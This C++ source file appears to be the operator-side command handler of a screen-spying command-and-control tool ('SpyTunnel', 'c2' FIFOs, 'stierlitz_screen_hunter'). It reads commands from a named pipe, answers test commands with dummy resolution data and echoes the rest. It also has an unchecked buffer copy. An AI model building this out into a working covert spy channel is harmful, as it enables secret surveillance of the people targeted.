#include "screen_hunter.hpp"

void ScreenHunter::exec_spy() {
    int rc;
    fifo_in_ = fifo_path_ + (std::string) "_in"; // screen hunter command line READ_ONLY

    int tunnel_fifo_in_ = open(fifo_in_.c_str(), O_RDONLY | O_NONBLOCK);
    if (tunnel_fifo_in_ < 0) {
        write_fifo_error("Error while opening the fifo path");
        return;
    }

    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
        return;
    }

    struct epoll_event screen_hunter_c2_event;
    screen_hunter_c2_event.data.fd = tunnel_fifo_in_;
    screen_hunter_c2_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_fifo_in_, &screen_hunter_c2_event) < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
        return;
    } 

    char command[1024] = {0};

    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);

        if (nfds < 0) {
            return;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                // Server shuts down
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                    close(tunnel_fifo_in_);
                }
                return;
            } else if (events[i].data.fd == tunnel_fifo_in_) {
                // Command from screen hunter. Forward the command to the tunnel_socket_
                rc = read(tunnel_fifo_in_, command, sizeof(command));
                if (rc <= 0) {
                    write_fifo_error("[SpyTunnel::run] Was unable to read command from tunnel_fifo_in_");
                    return;
                } 

                if (strncmp(command, "exit", 4) == 0) {
                    close(tunnel_fifo_);
                    close(tunnel_fifo_in_);
                    return ;
                } else if (rc == 4 && strncmp(command, "test", 4) == 0) {
                    int test_width = 1920;
                    int test_height = 1080;

                    uint8_t test_res_buffer[RES_UPDATE_KEY_LEN + 8];
                    memcpy(test_res_buffer, &test_width, 4);
                    memcpy(test_res_buffer+4, &test_height, 4);
                    memcpy(test_res_buffer+8, RES_UPDATE_KEY, RES_UPDATE_KEY_LEN);

                    write(tunnel_fifo_, test_res_buffer, sizeof(test_res_buffer));
                    break;  
                } else if (rc == 5 && strncmp(command, "test2", 5) == 0) {
                    uint8_t test_res_buffer[END_KEY_LEN + 64];
                    memset(test_res_buffer, 0, 64);
                    memcpy(test_res_buffer+64, END_KEY, END_KEY_LEN);

                    write(tunnel_fifo_, test_res_buffer, sizeof(test_res_buffer));   
                    break;
                }
                char buffer[BUFFER_SIZE];
                memcpy(buffer, "I received your command: ", 25);
                memcpy(buffer + 25, command, rc);
                buffer[25+rc] = '\0';

                std::cout << MAGENTA << "[ScreenHunter::exec_spy] Command: " << command << " Size: " << rc << std::endl;
                std::cout << MAGENTA << "[ScreenHunter::exec_spy] Sending:" << buffer << std::endl;

                write(tunnel_fifo_, buffer, rc + 26);
                break;
            
            } else if (events[i].data.fd == tunnel_socket_) {
                // Data from the target
            }
        }
    }

    if (tunnel_fifo_in_ != -1) {
        close(tunnel_fifo_in_);
    }

}
void ScreenHunter::spawn_window() {
    std::string end_key_len_str = std::to_string(END_KEY_LEN);
    std::string res_update_key_len_str = std::to_string(RES_UPDATE_KEY_LEN);

    execlp(
        "urxvt", "urxvt", "-hold", "-name", "stierlitz_screen_hunter", 
        "-e", SCREEN_HUNTER_SCRIPT_PATH, 
        fifo_path_.c_str(), 
        END_KEY, end_key_len_str.c_str(), 
        RES_UPDATE_KEY, res_update_key_len_str.c_str(),
        (char*)NULL
    );
}